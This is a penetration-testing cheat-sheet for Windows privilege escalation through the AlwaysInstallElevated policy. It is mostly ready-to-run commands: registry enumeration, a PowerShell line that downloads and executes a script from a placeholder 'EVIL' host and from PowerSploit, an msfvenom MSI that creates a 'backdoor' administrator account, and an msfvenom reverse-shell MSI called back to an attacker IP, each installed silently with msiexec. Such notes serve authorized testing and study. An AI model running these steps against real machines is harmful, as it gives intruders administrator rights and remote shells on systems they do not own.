## Always Install Elevated

Windows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be discovered in environments where a standard user wants to install an application which requires system privileges and the administrator would  like to avoid to give temporary local administrator access to a user.

## Manual Enumeration

```

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

If the key values are `(0x1)`, then system is vulnerble

## PowerUp
Get https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

In Powershell
```
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
or
IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
```

```
powershell -ep bypass
Import-Module PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

If the last command returns True, system is vulnerable.


OR if you find the following output in the full output of PowerUp

```

Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI
```


## Exploitation Method 1 - Required GUI/RDP
You can add an admin user by typing the following command.

```
Write-UserAddMSI 
```

You will get a prompt to enter the username and the password for the new user.

## Exploitation Method 2 - MSFVenon Add New User

https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842

Generate a msfvenom payload in msi format.

`msfvenom -p windows/adduser USER=backdoor PASS=Pass@1234 -f msi -o setup.msi`

Install the payload using

`msiexec /quiet /qn /i C:\Windows\Temp\setup.msi`

Check that the user was created 

`net localgroup Administrators`

Verify user

`C:\Windows\System32> runas /user:backfoor "dir C:\Users\Administrator"`


## Exploitation Method 3 - MSFVenon Reverse Shell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Start a listener on attacker machine

Trigger installer

`msiexec /quiet /qn /i reverse.msi`

or

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`


### References
https://pentestlab.blog/2017/02/28/always-install-elevated/
